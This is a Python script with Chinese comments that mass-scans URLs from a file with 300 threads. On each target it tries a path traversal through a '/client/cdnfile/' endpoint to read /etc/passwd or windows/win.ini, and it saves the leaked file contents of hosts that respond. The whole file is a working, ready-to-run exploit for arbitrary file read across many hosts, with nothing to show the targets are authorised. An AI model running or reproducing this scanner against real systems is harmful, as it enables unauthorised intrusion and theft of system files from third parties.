import requests
import threading
import queue
import urllib3
from urllib.parse import urlparse
import time

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 全局变量
thread_lock = threading.Lock()
vulnerable_urls = set()  # 用于记录已发现漏洞的URL，避免重复写入

# 漏洞检测函数
def check_vulnerability(url, path):
    target_url = f"{url.rstrip('/')}{path}"
    
    try:
        # 发送请求，禁用SSL验证
        response = requests.get(
            target_url,
            verify=False,
            timeout=10,
            allow_redirects=False  # 不跟随重定向
        )
        
        # 检查状态码
        if 300 <= response.status_code < 400:
            # 状态码为3xx，认为不存在漏洞
            print(f"[INFO] {target_url} - 状态码 {response.status_code}，不存在漏洞")
            return False, None
        
        # 检查状态码是否为200
        if response.status_code == 200:
            # 检查响应内容是否包含关键词
            content = response.text
            if "root" in content or "fonts" in content:
                print(f"[VULN] {target_url} - 存在漏洞!")
                return True, response
            else:
                print(f"[INFO] {target_url} - 状态码200但未匹配关键词")
                return False, None
        else:
            print(f"[INFO] {target_url} - 状态码 {response.status_code}，不存在漏洞")
            return False, None
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {target_url} - 请求失败: {str(e)}")
        return False, None
    except Exception as e:
        print(f"[ERROR] {target_url} - 发生错误: {str(e)}")
        return False, None

# 工作线程函数
def worker(url_queue, results_file):
    while not url_queue.empty():
        try:
            url = url_queue.get_nowait()
        except queue.Empty:
            break
        
        print(f"[*] 正在检测: {url}")
        
        # 定义要测试的两个路径
        test_paths = [
            "/client/cdnfile/C/etc/passwd?linux",
            "/client/cdnfile/1C/windows/win.ini?windows"
        ]
        
        found_vuln = False
        
        # 测试每个路径
        for path in test_paths:
            if found_vuln:  # 如果已经发现漏洞，跳过其他路径
                break
                
            is_vulnerable, response = check_vulnerability(url, path)
            
            if is_vulnerable:
                # 使用线程锁确保安全写入文件
                with thread_lock:
                    # 检查是否已经记录过此URL的漏洞
                    if url not in vulnerable_urls:
                        vulnerable_urls.add(url)
                        
                        # 准备漏洞详情
                        vuln_info = f"""\n{'='*60}
漏洞URL: {url}
漏洞路径: {path}
状态码: {response.status_code}
响应长度: {len(response.text)}
响应头:
{'\n'.join([f'{k}: {v}' for k, v in response.headers.items()])}
响应内容前500字符:
{response.text[:500]}
{'='*60}\n"""
                        
                        # 写入结果文件
                        try:
                            with open(results_file, 'a', encoding='utf-8') as f:
                                f.write(vuln_info)
                            print(f"[+] 漏洞详情已写入 {results_file}")
                        except Exception as e:
                            print(f"[ERROR] 写入文件失败: {str(e)}")
                
                found_vuln = True
        
        url_queue.task_done()

# 主函数
def main():
    # 配置文件
    url_file = "url.txt"
    results_file = "result.txt"
    max_threads = 300
    
    # 读取URL列表
    try:
        with open(url_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print(f"[ERROR] {url_file} 中没有找到URL")
            return
        
        print(f"[*] 从 {url_file} 中读取了 {len(urls)} 个URL")
        
    except FileNotFoundError:
        print(f"[ERROR] 文件 {url_file} 不存在")
        return
    except Exception as e:
        print(f"[ERROR] 读取文件失败: {str(e)}")
        return
    
    # 清空或创建结果文件
    try:
        open(results_file, 'w').close()
        print(f"[*] 已清空/创建结果文件: {results_file}")
    except Exception as e:
        print(f"[WARNING] 无法清空结果文件: {str(e)}")
    
    # 创建任务队列
    url_queue = queue.Queue()
    for url in urls:
        # 确保URL有协议头
        parsed = urlparse(url)
        if not parsed.scheme:
            url = "http://" + url
        url_queue.put(url)
    
    # 创建并启动线程
    threads = []
    print(f"[*] 启动 {max_threads} 个线程进行检测...")
    
    start_time = time.time()
    
    for i in range(max_threads):
        thread = threading.Thread(
            target=worker,
            args=(url_queue, results_file),
            name=f"Scanner-{i+1}"
        )
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # 等待所有任务完成
    url_queue.join()
    
    # 等待所有线程结束
    for thread in threads:
        thread.join(timeout=1)
    
    end_time = time.time()
    
    # 输出统计信息
    print(f"\n{'='*60}")
    print(f"扫描完成!")
    print(f"总URL数量: {len(urls)}")
    print(f"发现漏洞数量: {len(vulnerable_urls)}")
    print(f"扫描耗时: {end_time - start_time:.2f} 秒")
    print(f"结果已保存到: {results_file}")
    print(f"{'='*60}")
    
    if vulnerable_urls:
        print("\n发现漏洞的URL:")
        for vuln_url in vulnerable_urls:
            print(f"  - {vuln_url}")
    else:
        print("\n未发现任何漏洞")

if __name__ == "__main__":
    main()